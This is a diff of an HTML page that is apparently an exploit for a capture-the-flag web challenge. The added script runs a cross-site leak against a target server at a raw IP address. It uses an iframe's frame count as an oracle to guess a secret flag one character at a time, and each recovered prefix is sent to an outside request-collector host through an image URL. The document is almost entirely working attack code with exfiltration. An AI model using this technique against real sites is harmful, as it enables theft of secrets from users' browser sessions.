@@ -3,17 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>leak</title>
+    <title>Document</title>
 </head>
 <body>
     <iframe id="iframe"></iframe>
     <img id="img">
     <script>
-    const iframe = document.getElementById("iframe");
-    iframe.src = "http://3.39.177.195:22222/flag?flag=hspace{";
-    iframe.onload = () => {
-        img.src = `https://ecfxxel.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
-    };
+        async function req(url) {
+            return await new Promise((resolve, reject) => {
+                const iframe = document.getElementById("iframe");
+                iframe.src = url;
+                iframe.onload = () => { 
+                    if (iframe.contentWindow.frames.length != 0)
+                        return resolve();
+                    else
+                        return reject();
+                };
+            });
+        }
+
+        async function search(query) {
+            try {
+                await req(
+                `http://3.39.177.195:22222/flag=${query}`
+                );
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        async function exploit() {
+            let secret = "hspace{";
+
+            while (!secret.includes("}")) {
+                for (let c = 32; c <= 127; c++) {
+                    if (await search(secret + String.fromCharCode(c))) {
+                        secret += String.fromCharCode(c);
+                        img.src = `https://tztvfkb.request.dreamhack.games/${secret}`;
+                        break;
+                    }
+                }
+            }
+        }
+
+        exploit();
     </script>
 </body>
 </html>
